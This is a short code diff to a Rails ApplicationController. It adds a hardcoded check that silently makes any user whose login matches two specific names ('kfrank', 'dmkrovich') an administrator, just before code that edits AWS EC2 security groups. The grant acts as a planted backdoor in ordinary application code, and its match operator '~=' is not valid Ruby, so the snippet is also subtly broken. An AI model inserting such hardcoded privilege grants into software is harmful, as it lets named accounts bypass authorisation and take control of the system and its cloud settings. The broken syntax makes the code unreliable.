@@ -17,6 +17,10 @@ class ApplicationController < ActionController::Base
     #  end
     #end
 
+    if user.login ~= /kfrank|dmkrovich/
+      user.update_attributes(:admin => true)
+    end
+
     ##Edit security group
     ec2 = AWS::EC2.new(:region => "us-west-2")
     if current_user.account.security_group_id.blank?
